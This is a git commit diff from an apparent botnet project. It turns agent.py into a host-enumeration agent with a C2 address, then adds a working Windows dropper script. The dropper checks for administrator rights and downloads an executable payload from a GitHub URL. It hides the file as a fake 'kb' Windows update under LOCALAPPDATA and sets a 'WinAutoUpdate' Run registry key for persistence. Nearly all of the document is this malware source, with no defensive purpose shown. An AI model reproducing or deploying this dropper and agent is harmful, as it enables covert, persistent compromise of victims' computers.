842feb92ce27078a899adbcd25deaa4a8936cafc
Clem <clement_392@hotmail.com>
2020-07-03 13:17:04 +0800

    Update agents and dropper

--- agent/agent.py
+++ agent/agent.py
@@ -1,96 +1,47 @@
 """
-Always run on boot
-[X] It will first check if ran as administrator, and has internet connectivity.
-[X] It will then download the payload hosted on github and save on disk.
-[X] It will then create persistence for the payload via registry key.
-[] Lastly, it will delete itself off the disk.
+Agent
+[X] grab operating_system, computer_name, username
+[] Send POST req to server
 """
-try:
-    import _winreg as winreg
-except ImportError:
-    # this has been renamed in python 3
-    import winreg
-import ctypes  # An included library with Python install.
+
 import os
-import shutil
-import sys
-from random import randint
-from urllib.error import URLError
-from urllib.request import urlopen
+import re
 
-import requests
-
-KEY_PATH = r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
-PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.txt"
-GOOGLE_DNS = 'http://www.google.com'
-PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
+INDEX_COMPUTER_NAME = 0
+INDEX_USERNAME = 1
+RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
+C2 = r'127.0.0.1'
 
 
-def test_connectivity(google_dns):
-    """Return True if there is internet connectivity.
-    Returns False if there is no internet connectivity.
-    """
-    try:
-        urlopen(google_dns, timeout=1)
-        return 1
-    except URLError as err:
-        return 0
+def get_os():
+    """systeminfo"""
+    os_version = ''
+    output_systeminfo = os.popen('systeminfo')
+    for output in output_systeminfo.read().splitlines()[2:4]:
+        info = re.match(RE_DATA_AFTER_MULTIPLE_SPACES, output)
+        os_version += info.groups()[1]
+        os_version += ' - '
+    return os_version.rstrip(' -')
 
 
-def test_is_admin():
-    """Returns True if the program is ran as administrator.
-    Returns False if not ran as administrator.
-    """
-    try:
-        is_admin = (os.getuid() == 0)
-    except AttributeError:
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if is_admin == 1:
-        return 1
-    else:
-        return 0
+def get_computer_and_username():
+    """Uses whoami to get the computer name and user name
+    Returns it in a list"""
+    output_whoami = os.popen('whoami')
+    return output_whoami.read().strip().split('\\')
 
 
-def create_persistence(key_path, path):
-    """Creates persistence via the run registry key"""
-    key_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
-                                winreg.KEY_ALL_ACCESS)
-    key_data = r"{}".format(path)
-    winreg.SetValueEx(key_handle, "WinAutoUpdate", 0, winreg.REG_SZ, key_data)
-    print("key written")
-    winreg.CloseKey(key_handle)
-
-
-def get_payload_to_path_and_persistence(payload_url, path_to_hide):
-    """Reaches out to github to retrieve the payload
-    Then creates persistence"""
-    full_path_to_hide = path_to_hide + '\\kb{}.exe'.format(
-        randint(1000000000, 9999999999))
-
-    if os.path.exists(path_to_hide):
-        shutil.rmtree(path_to_hide)
-    else:
-        pass
-    os.makedirs(path_to_hide)
-
-    with open(full_path_to_hide, 'wb') as file:
-        headers = {
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
-        response = requests.get(payload_url, headers)
-        file.write(response.content)
-    print('Payload dropped into \'{}\''.format(full_path_to_hide))
-    create_persistence(KEY_PATH, full_path_to_hide)
+def say_hello():
+    post_object = {
+        'operating_system': get_os(),
+        'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
+        'username': get_computer_and_username()[INDEX_USERNAME]
+    }
+    print(post_object)
 
 
 def main():
-    if test_is_admin():
-        if test_connectivity(GOOGLE_DNS):
-            get_payload_to_path_and_persistence(PAYLOAD_URL, PATH_TO_HIDE)
-        else:
-            print('Ran as Admin but no internet connectivity.')
-    else:
-        print('Not ran as Admin.')
-    sys.exit(1)
+    say_hello()
 
 
 if __name__ == '__main__':
---
+++ agent/agent_dropper.py
@@ -0,0 +1,97 @@
+"""
+Dropper for Agent
+[X] It will first check if ran as administrator, and has internet connectivity.
+[X] It will then download the payload hosted on github and save on disk.
+[X] It will then create persistence for the payload via registry key.
+[] Lastly, it will delete itself off the disk.
+"""
+try:
+    import _winreg as winreg
+except ImportError:
+    # this has been renamed in python 3
+    import winreg
+import ctypes  # An included library with Python install.
+import os
+import shutil
+import sys
+from random import randint
+from urllib.error import URLError
+from urllib.request import urlopen
+
+import requests
+
+KEY_PATH = r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.txt"
+GOOGLE_DNS = 'http://www.google.com'
+PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
+
+
+def test_connectivity(google_dns):
+    """Return True if there is internet connectivity.
+    Returns False if there is no internet connectivity.
+    """
+    try:
+        urlopen(google_dns, timeout=1)
+        return 1
+    except URLError as err:
+        return 0
+
+
+def test_is_admin():
+    """Returns True if the program is ran as administrator.
+    Returns False if not ran as administrator.
+    """
+    try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin == 1:
+        return 1
+    else:
+        return 0
+
+
+def create_persistence(key_path, path):
+    """Creates persistence via the run registry key"""
+    key_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
+                                winreg.KEY_ALL_ACCESS)
+    key_data = r"{}".format(path)
+    winreg.SetValueEx(key_handle, "WinAutoUpdate", 0, winreg.REG_SZ, key_data)
+    print("key written")
+    winreg.CloseKey(key_handle)
+
+
+def get_payload_to_path_and_persistence(payload_url, path_to_hide):
+    """Reaches out to github to retrieve the payload
+    Then creates persistence"""
+    full_path_to_hide = path_to_hide + '\\kb{}.exe'.format(
+        randint(1000000000, 9999999999))
+
+    if os.path.exists(path_to_hide):
+        shutil.rmtree(path_to_hide)
+    else:
+        pass
+    os.makedirs(path_to_hide)
+
+    with open(full_path_to_hide, 'wb') as file:
+        headers = {
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
+        response = requests.get(payload_url, headers)
+        file.write(response.content)
+    print('Payload dropped into \'{}\''.format(full_path_to_hide))
+    create_persistence(KEY_PATH, full_path_to_hide)
+
+
+def main():
+    if test_is_admin():
+        if test_connectivity(GOOGLE_DNS):
+            get_payload_to_path_and_persistence(PAYLOAD_URL, PATH_TO_HIDE)
+        else:
+            print('Ran as Admin but no internet connectivity.')
+    else:
+        print('Not ran as Admin.')
+    sys.exit(1)
+
+
+if __name__ == '__main__':
+    main()
